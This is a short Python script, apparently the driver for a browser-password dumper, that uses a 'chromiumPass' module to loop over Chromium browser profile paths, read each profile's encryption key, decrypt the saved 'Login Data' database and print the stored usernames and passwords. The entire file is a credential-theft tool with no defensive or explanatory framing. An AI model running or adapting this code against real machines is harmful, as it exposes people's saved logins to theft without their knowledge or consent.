import chromiumPass as cp

if __name__ == '__main__':
    indicator = 1
    for path in cp.get_path():
        path_key = path + "\\" + cp.KEY_FILE
        path_login_data = path + "\\Default\\" + cp.LOGIN_DATA_FILE
        decrypt_key = cp.get_key(path_key)
        result = cp.get_user_info(path_login_data, decrypt_key)
        print(cp.get_user_info(path_login_data, decrypt_key))
